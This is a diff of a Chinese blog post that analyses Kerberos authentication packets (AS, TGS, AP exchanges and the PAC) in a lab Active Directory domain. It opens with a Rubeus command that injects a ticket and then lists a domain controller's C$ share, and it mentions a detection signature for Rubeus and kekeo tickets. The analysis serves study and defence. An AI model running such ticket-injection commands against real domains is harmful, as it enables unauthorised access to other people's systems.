+<span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgs</span> <span class="p">/</span><span class="n">service</span><span class="err">:</span><span class="s2">&#34;cifs/owa2013.rootkit.org&#34;</span> <span class="p">/</span><span class="n">dc</span><span class="err">:</span><span class="n">owa2013</span><span class="p">.</span><span class="n">rootkit</span><span class="p">.</span><span class="n">org</span> <span class="p">/</span><span class="n">ptt</span> <span class="p">/</span><span class="n">ticket</span><span class="err">:</span><span class="n">前面的TGT票据</span>
+<span class="c">#访问服务</span>
+<span class="nb">dir </span><span class="p">\\</span><span class="n">owa2013</span><span class="p">.</span><span class="n">rootkit</span><span class="p">.</span><span class="n">org</span><span class="p">\</span><span class="n">c</span><span class="p">$</span> 
 </code></pre></td></tr></table></div>
 </div>
+</div><p>所有数据包如下:
+<img src="/images/16433394938312.jpg" alt=""></p>
+<h2 id="as-请求分析"><a href="#as-请求分析" class="anchor-link">#</a><a href="#contents:as-请求分析" class="headings">AS 请求分析</a></h2>
+<h3 id="as_req"><a href="#as_req" class="anchor-link">#</a><a href="#contents:as_req" class="headings">AS_REQ</a></h3>
+<p>用户输入账号密码访问域内的服务，本机会向KDC的AS 认证服务发送一个AS_REQ请求。</p>
+<p>请求主要包含用户Hash 加密的时间戳、请求用户名、协商Hash的加密类型等信息。</p>
+<ul>
+<li>
+<p><strong>整体请求内容</strong></p>
+<p><img src="/images/16433395567774.jpg" alt=""></p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">1</span><span class="p">.</span><span class="n">pvno</span> <span class="n">kerberos的版本号</span>
+<span class="n">2</span><span class="p">.</span><span class="nb">msg-type</span> <span class="n">消息类型</span><span class="err">，</span><span class="n">这里就是KRB_AS_REQ</span><span class="p">(</span><span class="n">0x0a</span><span class="p">)</span>
+<span class="n">3</span><span class="p">.</span><span class="n">PA_DATA</span> <span class="nb">Pre-authentication</span> <span class="n">Data</span><span class="err">，</span><span class="n">预身份认证</span><span class="err">，</span><span class="n">每个认证消息有type和value</span><span class="err">。</span>
+<span class="n">4</span><span class="p">.</span><span class="nb">req-body</span> <span class="n">请求体</span>
+</code></pre></td></tr></table></div>
 </div>
+</div></li>
+<li>
+<p><strong>PA_DATA</strong></p>
+<p><img src="/images/16433395743668.jpg" alt=""></p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">PA-DATA</span> <span class="nb">PA-ENC</span><span class="n">-TIMESTAMP</span> <span class="n">用户HASH加密后的时间戳</span>
+	<span class="nb">padata-type</span><span class="err">:</span> <span class="n">padata类型</span>
+		<span class="nb">padata-vaule</span><span class="err">:</span> <span class="n">padata的值</span>
+			<span class="n">etype</span><span class="err">:</span>  <span class="n">加密类型</span>
+			<span class="n">cipher</span><span class="err">:</span> <span class="n">加密后的值</span>
+<span class="nb">PA-DATA</span> <span class="nb">PA-PAC</span><span class="n">-REQUEST</span><span class="err">：</span><span class="n">PAC扩展</span>
+	<span class="nb">padata-type</span><span class="err">:</span> <span class="n">padata类型</span>
+		<span class="nb">padata-vaule</span><span class="err">:</span> <span class="n">padata的值</span>
+		<span class="nb">include-pac</span><span class="err">:</span> <span class="n">是否包含PAC</span><span class="err">，</span><span class="n">如果包含那么在响应包中就会返回PAC</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+<li>
+<p><strong>req-body</strong></p>
+<p><img src="/images/16433395901605.jpg" alt=""></p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">padding</span><span class="err">:</span><span class="n">填充</span>
+<span class="nb">kdc-options</span><span class="err">:</span><span class="n">用于与KDC约定一些选项设置</span>
+<span class="n">cname</span><span class="err">:</span> <span class="n">客户端用户名</span>
+<span class="n">realm</span><span class="err">:</span> <span class="n">域名</span> 
+<span class="n">sname</span><span class="err">:</span> <span class="n">服务端用户名</span><span class="err">，</span><span class="n">在AS_REQ</span> <span class="n">中sname是krbtgt</span><span class="err">，</span><span class="n">类型是KRB_NT_SRV_INST</span>
+<span class="n">till</span><span class="err">:</span> <span class="n">到期时间</span><span class="err">，</span><span class="n">rubeus和kekeo都是20370913024805Z</span><span class="err">，</span><span class="n">可以作为特征检测</span>
+<span class="n">nonce</span><span class="err">：</span><span class="n">随机生成的一个数</span><span class="err">，</span><span class="n">用于检测重放攻击</span>
+<span class="n">etype</span><span class="err">:</span> <span class="n">协商加密类型</span><span class="err">，</span><span class="n">KDC按照etype类型选择用户hash对应的加密方式</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>kdc-options 字段</p>
+<p><img src="/images/16433396082150.jpg" alt=""></p>
+</li>
+</ul>
+<h3 id="as_rep"><a href="#as_rep" class="anchor-link">#</a><a href="#contents:as_rep" class="headings">AS_REP</a></h3>
+<p>KDC 收到请求后，通过活动目录查询到该用户的密码Hash，用该Hash对请求包的<code>PA-ENC-TIMESTAMP</code>进行解密。解密成功后，还会检查要求时间戳的范围在五分钟内且数据包无重放，则预认证成功。</p>
+<p>返回krbtgt 用户的NTLM Hash加密后的TGT和用户NTLM Hash加密的Login Session key（AS 随机生成）。</p>
+<p>TGT 主要包含Login Session Key、时间戳和 PAC。Login Session Key的作用是作为用户和KDC后几个阶段之间通信加密的会话密钥。</p>
+<ul>
+<li>
+<p><strong>整体响应内容</strong></p>
+<p><img src="/images/16433397764375.jpg" alt=""></p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">pvno</span><span class="err">:</span> <span class="n">kerberos的版本号</span>
+<span class="nb">msg-type</span><span class="err">:</span> <span class="n">消息类型KRB</span><span class="o">-AS</span><span class="n">-REP</span>
+<span class="n">crealm</span><span class="err">:</span> <span class="n">域名</span>
+<span class="n">cname</span><span class="err">:</span> <span class="n">客户端用户名</span>
+<span class="n">ticket</span><span class="err">:</span> <span class="n">即TGT票据</span>
+<span class="n">enc_part</span><span class="err">:</span> <span class="n">这部分是用用户密码Hash加密的</span><span class="err">，</span><span class="n">里面包含Login</span> <span class="n">session</span> <span class="n">key</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+<li>
+<p><strong>ticket</strong></p>
+<p><img src="/images/16433397954929.jpg" alt=""></p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">tkt-vno</span><span class="err">:</span> <span class="n">TGT</span> <span class="n">版本号</span>
+<span class="n">realm</span><span class="err">:</span> <span class="n">域名</span>
+<span class="n">sname</span><span class="err">:</span> <span class="n">请求的服务名称</span> <span class="n">krbtgt</span>
+<span class="nb">enc-part</span><span class="err">:</span> <span class="n">这部份是用krbtgt的密码Hash加密的</span><span class="err">，</span><span class="n">其中包含了请求用户的PAC信息</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>解密enc-part部分，其中<code>e8e1f426</code> 开头的值就是Login session key。</p>
+<p><img src="/images/16433398108951.jpg" alt=""></p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">key</span><span class="err">:</span> <span class="n">就是Login</span> <span class="n">session</span> <span class="n">key</span>
+<span class="nb">authorization-data</span><span class="err">:</span> <span class="n">里面是PAC的内容</span><span class="err">，</span><span class="n">此处不细说PAC</span> <span class="err">，</span><span class="n">后文分析</span><span class="err">。</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+<li>
+<p><strong>enc_part</strong></p>
+<p><img src="/images/16433398435167.jpg" alt=""></p>
+<p>内容是由用户密码Hash加密的Login session key。</p>
+</li>
+</ul>
+<h2 id="tgs-请求分析"><a href="#tgs-请求分析" class="anchor-link">#</a><a href="#contents:tgs-请求分析" class="headings">TGS 请求分析</a></h2>
+<h3 id="tgs_req"><a href="#tgs_req" class="anchor-link">#</a><a href="#contents:tgs_req" class="headings">TGS_REQ</a></h3>
+<p>用户通过AS_REP拿到TGT票据，并用自己的Hash 解密获得Login session key。再用Login session key 加密客户端用户名、时间戳等信息，和TGT 一起向KDC 的TGS 服务发起请求，请求服务票据。（这一步不需要账号或者密码。主要以TGT 作为凭证）</p>
+<ul>
+<li>
+<p><strong>整体请求内容</strong></p>
+<p><img src="/images/16433399381159.jpg" alt=""></p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">pvno</span><span class="err">:</span> <span class="n">kerberos的版本号</span>
+<span class="nb">msg-type</span><span class="err">:</span> <span class="n">消息类型</span>
+<span class="n">padata</span><span class="err">:</span> <span class="n">这个部分包含之前的TGT票据</span><span class="err">，</span><span class="n">以及Login</span> <span class="n">session</span> <span class="n">key</span> <span class="n">加密的内容</span>
+<span class="nb">req-body</span><span class="err">:</span> <span class="n">请求体</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+<li>
+<p><strong>padata</strong></p>
+<p><img src="/images/16433399553851.jpg" alt=""></p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">AP_REQ</span><span class="err">:</span> <span class="n">这部分会携带AS_REP里面获取到的TGT票据</span><span class="err">、</span><span class="n">客户端的认证信息</span>
+	<span class="p">...</span> <span class="n">省略一些前面说过的字段</span>
+	<span class="n">ticket</span><span class="err">:</span> <span class="n">可以看到这部分就是TGT票据</span>
+	<span class="n">authenticator</span><span class="err">:</span> <span class="n">如下图</span><span class="err">，</span><span class="n">这部分就是Login</span> <span class="n">session</span> <span class="n">key加密的客户端信息</span><span class="err">:</span> <span class="n">请求的用户名</span><span class="err">、</span><span class="n">时间戳</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p><img src="/images/16433399763549.jpg" alt=""></p>
+<p>可以看到是由Login session key（<code>e8e1f426</code> 开头的值）解密出来的。</p>
+</li>
+<li>
+<p><strong>req-body</strong></p>
+<p><img src="/images/16433399922282.jpg" alt=""></p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">...</span><span class="n">省略介绍过的内容</span>
+<span class="n">cname</span><span class="err">:</span> <span class="n">请求的用户名</span>
+<span class="n">sname</span><span class="err">:</span> <span class="n">请求的指定服务</span>
+<span class="n">etype</span><span class="err">:</span> <span class="n">支持的加密类型</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+</ul>
+<h3 id="tgs_rep"><a href="#tgs_rep" class="anchor-link">#</a><a href="#contents:tgs_rep" class="headings">TGS_REP</a></h3>
+<p>TGS 服务收到请求后，使用 Login session key 对authenticator 解密，获取到请求的用户名和时间戳。并检查时间戳在5分钟的有效范围内。KDC 使用krbtgt 用户的hash解密TGT 票据，把解密后的用户名等信息与authenticator 解密后的内容比对，相同则认证通过，颁发服务票据。</p>
+<p>返回服务票据（ST）与Login session key加密的Server Session key和请求的服务名称。</p>
+<p>服务票据（ST）中包含Server Session key、客户端名称、票据有效时间、PAC 等信息。</p>
+<ul>
+<li>
+<p><strong>整体响应内容</strong></p>
+<p><img src="/images/16433400445338.jpg" alt=""></p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">...</span><span class="n">省略介绍过的内容</span>
+<span class="n">ticket</span><span class="err">:</span> <span class="n">这个是服务票据ST</span><span class="err">，</span><span class="n">它由服务账号的Hash加密</span>
+<span class="nb">enc-part</span><span class="err">:</span> <span class="n">Login</span> <span class="n">session</span> <span class="n">key加密的Server</span> <span class="n">Session</span> <span class="n">key等信息</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+<li>
+<p><strong>ticket</strong></p>
+<p><img src="/images/16433400596785.jpg" alt=""></p>
+<p>字段前面都介绍过，这里不再多说。下面解密enc-part内容，使用<code>OWA2013$rootkit.org</code>服务账号Hash解密，内容如下</p>
+<p><img src="/images/16433400785655.jpg" alt=""></p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">key</span><span class="err">:</span> <span class="n">这里b808087f开头的key就是Server</span> <span class="n">Session</span> <span class="n">key</span>
+<span class="nb">authorization-data</span><span class="err">:</span> <span class="n">是用户的PAC</span><span class="err">，</span><span class="n">后文细讲</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+<li>
+<p><strong>enc-part</strong></p>
+<p>如下是enc-part  解密后的字段。可以看到依旧是用<code>e8e1f426</code> 开头的Login session key 解密出来的，并且Server Session key 和 ST 票据中的相同。</p>
+<p><img src="/images/16433400953721.jpg" alt=""></p>
+</li>
+</ul>
+<h2 id="server-请求分析"><a href="#server-请求分析" class="anchor-link">#</a><a href="#contents:server-请求分析" class="headings">Server 请求分析</a></h2>
+<h3 id="ap_req"><a href="#ap_req" class="anchor-link">#</a><a href="#contents:ap_req" class="headings">AP_REQ</a></h3>
+<p>用户解密Login session key 解密的内容，获得Server Session key 。然后把用户名、时间戳等信息用Server Session key 加密，同服务票据（ST）发送给目标服务。</p>
+<p><em><strong>Tips:</strong></em> 注意本篇文章的的第一张图中，截取了访问域控 CIFS 服务的所有Kerberos请求包。细心点的人就会发现竟然有两次TGS 请求。当我第一次看到为什么会有两次TGS 请求的时候也很疑惑，但这里先不说，可以暂时忽略第二次TGS 请求。等到了后面讲非约束委派的时候就揭晓答案了。</p>
+<ul>
+<li>
+<p><strong>整体请求内容</strong></p>
+<p><img src="/images/16433401619561.jpg" alt=""></p>
+</li>
+<li>
+<p>跟进Kerberos 协议</p>
+<p><img src="/images/16433401780867.jpg" alt=""></p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">ticket</span><span class="err">:</span> <span class="n">这里的ticket字段就是ST票据的内容</span>
+<span class="n">authenticator</span><span class="err">:</span> <span class="n">就是Server</span> <span class="n">Session</span> <span class="n">Key加密的客户端信息</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>解密ticket，可看到和之前的ST 票据一样。</p>
+<p><img src="/images/16433401928335.jpg" alt=""></p>
+<p>可看到使用<code>b808087f</code>开头的Server Session Key 解密 authenticator</p>
+<p><img src="/images/16433402080116.jpg" alt=""></p>
+</li>
+</ul>
+<h3 id="ap_rep"><a href="#ap_rep" class="anchor-link">#</a><a href="#contents:ap_rep" class="headings">AP_REP</a></h3>
+<p>服务器会收到用户发来的ST 后，用自己的Hash 解密获得Server Session Key。再用该Key 解密被加密的客户端信息（请求的用户名、时间戳等），并进行校验以及与ST 中的客户端信息进行比对，相同则认证通过。有PAC的情况: 服务端还会向KDC 请求验证该用户的权限，有权限才能访问。</p>
+<p>下图是服务器的SMB响应包</p>
+<p><img src="/images/16433402219694.jpg" alt=""></p>
+<h2 id="pac"><a href="#pac" class="anchor-link">#</a><a href="#contents:pac" class="headings">PAC</a></h2>
+<p>PAC (Privilege Attribute Certificate，特权属性证书)，其中所包含的是各种授权信息，例如用户RID，所属组的RID、所属组的个数等信息。</p>
+<p>前面TGT 票据和ST 票据中的<code>authorization_data</code> 字段一直没有解释。其实这个字段里的内容就是PAC。如果除开该字段，Kerberos 协议就仅能证明用户身份，无法表示用户权限。为此微软引进了此字段来表示用户权限。</p>
+<p><strong>有PAC 的请求流程</strong></p>
+<ol>
+<li>
+<p>用户发起AS_REQ，KDC从AS-REQ 请求中取出cname字段并查询活动目录，找到<code>sAMAccountName</code>属性为cname字段的值的用户，用该用户的身份生成一个对应的PAC。用户也可以指定<code>include-pac: False/True</code>来要求KDC在返回的票据中是否包含PAC。</p>
+</li>
+<li>
+<p>用户发起TGS_REQ，KDC收到TGT后，利用krbtgt密钥对其解密并验证PAC的签名。签名正确，则证明PAC未经过篡改，然后在PAC的尾部重新生成两个签名: Server Signature （要请求的服务的hash生成的签名）和KDC Signature。然后把新的PAC 拷贝到ST服务票据中。（此步骤不校验PAC 中用户有没有访问服务的权限，只要TGT 正确就返回ST票据）</p>
+<p>如果是<code>S4u2Self</code>请求的话，ST服务票据中的PAC是重新生成的（生成的是模拟用户的PAC）。</p>
+</li>
+<li>
+<p>用户拿着ST 票据去请求服务，服务使用hash解密ST 票据，获取PAC 后检查用户的sid以及所在的组并并与自身的ACL进行对比，判断用户是否有访问服务的权限。（如果服务开启了验证PAC 的签名，还会向KDC 发送<code>KERB_VERIFY_PAC</code>验证PAC 的签名）</p>
+</li>
+</ol>
+<p>只要TGT 票据中不带有PAC，那么ST 票据中也不会带有PAC，也就没有权限访问任何服务。</p>
+<p><strong>TGT 中的 PAC 内容</strong></p>
+<p><img src="/images/16433402674743.jpg" alt=""></p>
+<p><code>AD-IF-RELEVANT</code>元素是最外层的包装器，它封装了另一个<code>AD-WIN2K-PAC</code>类型的<code>AuthorizationData</code>元素。<code>ad-data</code>为一段连续的空间。段空间包含一个<code>头部PACTYPE</code>以及若干个<code>PAC_INFO_BUFFER</code> 。<code>头部PACTYPE</code>包括cBuffers、Version与缓冲区。</p>
+<ul>
+<li><code>PAC_INFO_BUFFER</code>为key-value型，key 的类型如下表所示（key对应上图中红色下划线的值）此表<a href="https://daiker.gitbook.io/windows-protocol/kerberos/3" target="_blank" rel="noopener">参考</a>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>意义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x00000001</td>
+<td>登录信息。PAC结构必须包含一个这种类型的缓冲区。其他登录信息缓冲区必须被忽略。</td>
+</tr>
+<tr>
+<td>0x00000002</td>
+<td>凭证信息。PAC结构不应包含多个此类缓冲区。第二或后续凭证信息缓冲区在接收时必须被忽略。</td>
+</tr>
+<tr>
+<td>0x00000006</td>
+<td>服务器校验和。PAC结构必须包含一个这种类型的缓冲区。其他登录服务器校验和缓冲区必须被忽略。</td>
+</tr>
+<tr>
+<td>0x00000007</td>
+<td>KDC校验和。PAC结构必须包含一个这种类型的缓冲区。附加的KDC校验和缓冲区必须被忽略。</td>
+</tr>
+<tr>
+<td>0x0000000A</td>
+<td>客户名称和票证信息。PAC结构必须包含一个这种类型的缓冲区。附加的客户和票据信息缓冲区必须被忽略。</td>
+</tr>
+<tr>
+<td>0x0000000B</td>
+<td>受约束的委派信息。PAC结构必须包含一个S4U2proxy请求的此类缓冲区，否则不包含。附加的受约束的委托信息缓冲区必须被忽略。</td>
+</tr>
+<tr>
+<td>0x0000000C</td>
+<td>用户主体名称（UPN）和域名系统（DNS）信息。PAC结构不应包含多个这种类型的缓冲区。接收时必须忽略第二个或后续的UPN和DNS信息缓冲区。</td>
+</tr>
+<tr>
+<td>0x0000000D</td>
+<td>客户索取信息。PAC结构不应包含多个这种类型的缓冲区。附加的客户要求信息缓冲区必须被忽略。</td>
+</tr>
+<tr>
+<td>0x0000000E</td>
+<td>设备信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备信息缓冲区必须被忽略。</td>
+</tr>
+<tr>
+<td>0x0000000F</td>
+<td>设备声明信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备声明信息缓冲区必须被忽略。</td>
+</tr>
+</tbody>
+</table></div>
+</li>
+</ul>
+<p>其中最重要的就是<code>0x00000001 KERB_VALIDATION_INFO</code> ，也就是上图中的<code>Type: Logon Info (1)</code> 。这个结构是登录信息，主要靠它来验证用户身份。<code>Type: Logon Info (1)</code> 内容如下</p>
+<p><img src="/images/16433402822227.jpg" alt=""></p>
+<p>其次，抓包发现 ST 中的PAC 和 TGT 中的PAC 内容大致相同（不完全相同）。</p>
+<p>下文分析委派的抓包与原理。</p>
+<h2 id="参考"><a href="#参考" class="anchor-link">#</a><a href="#contents:参考" class="headings">参考</a></h2>
+<p><a href="https://daiker.gitbook.io/windows-protocol/kerberos" target="_blank" rel="noopener">https://daiker.gitbook.io/windows-protocol/kerberos</a></p>
+
             </div>
 
             
@@ -442,7 +706,7 @@
                 
                 
                 
-                <li class="copyright-item link"><span class="copyright-item-text">链接</span>：<a href="/2021/01/AutoIt-SendKey%E7%BB%95%E8%BF%87%E5%A0%A1%E5%9E%92%E6%9C%BA%E4%B8%A4%E6%AD%A5%E9%AA%8C%E8%AF%81/" target="_blank" rel="noopener">https://myzxcg.com/2021/01/AutoIt-SendKey绕过堡垒机两步验证/</a></li>
+                <li class="copyright-item link"><span class="copyright-item-text">链接</span>：<a href="/2021/08/Kerberos-%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90%E4%B8%80/" target="_blank" rel="noopener">https://myzxcg.com/2021/08/Kerberos-认证过程详细分析一/</a></li>
             
             <li class="copyright-item license"><span class="copyright-item-text">许可</span>：<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a></li>
             
@@ -472,10 +736,6 @@
             <ul class="related-list">
                 
                     <li class="related-item">
-                        <a href="/2021/11/%E5%88%A9%E7%94%A8.NET-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%81%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" class="related-link">利用.NET 反序列化做权限维持</a>
-                    </li>
-                
-                    <li class="related-item">
                         <a href="/2021/10/%E5%9F%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/" class="related-link">域委派利用</a>
                     </li>
                 
@@ -491,6 +751,10 @@
                         <a href="/2021/08/%E5%9F%9F%E7%94%A8%E6%88%B7%E4%B8%8E%E5%9F%9F%E6%88%90%E5%91%98%E6%9C%BA%E5%99%A8%E5%85%B3%E7%B3%BB%E5%8F%8A%E5%88%A9%E7%94%A8/" class="related-link">域用户与域成员机器关系及利用</a>
                     </li>
                 
+                    <li class="related-item">
+                        <a href="/2021/08/Windows-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%A8%A1%E5%9E%8B%E4%BA%8C/" class="related-link">Windows 访问控制模型（二）</a>
+                    </li>
+                
             </ul>
         </div>
     
@@ -503,7 +767,7 @@
         
     <footer class="minimal-footer">
         
-            <div class="post-tag"><a href="/tags/Windows/" rel="tag" class="post-tag-link">#windows</a></div>
+            <div class="post-tag"><a href="/tags/%E5%9F%9F%E7%9B%B8%E5%85%B3/" rel="tag" class="post-tag-link">#域相关</a></div>
         
         
         
@@ -527,12 +791,12 @@
         <ul class="post-nav">
             
                 <li class="post-nav-prev">
-                    <a href="/2021/08/Kerberos-%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90%E4%B8%80/" rel="prev">&lt; Kerberos 认证过程详细分析（一）</a>
+                    <a href="/2021/08/Kerberos-%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90%E4%BA%8C/" rel="prev">&lt; Kerberos 认证过程详细分析（二）</a>
                 </li>
             
             
                 <li class="post-nav-next">
-                    <a href="/2020/12/Windows-Https%E6%B5%81%E9%87%8F%E6%8A%93%E5%8F%96%E4%B8%8E%E8%A7%A3%E5%AF%86/" rel="next">Windows Https流量抓取与解密 &gt;</a>
+                    <a href="/2021/01/AutoIt-SendKey%E7%BB%95%E8%BF%87%E5%A0%A1%E5%9E%92%E6%9C%BA%E4%B8%A4%E6%AD%A5%E9%AA%8C%E8%AF%81/" rel="next">AutoIt SendKey绕过堡垒机两步验证 &gt;</a>
                 </li>
             
         </ul>
